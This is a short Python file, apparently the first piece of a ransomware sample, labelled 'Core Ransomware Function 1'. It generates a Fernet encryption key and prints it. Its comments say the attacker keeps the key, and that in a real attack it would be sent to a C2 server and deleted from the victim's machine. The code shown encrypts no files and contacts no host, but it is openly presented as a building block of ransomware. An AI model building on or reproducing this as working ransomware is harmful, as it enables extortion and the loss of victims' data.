import os
from cryptography.fernet import Fernet


# --- Core Ransomware Function 1: Generate Key ---
def generate_ransom_key():
    """Generates a unique encryption key."""
    # This key is what the attacker would keep secret.
    key = Fernet.generate_key()

    # In a real attack, the key would be sent to a C2 server
    # and securely deleted from the victim's machine.
    print(f"🔑 Generated Key (ATTACKER KEEPS THIS): {key.decode()}")
    return key
print(generate_ransom_key())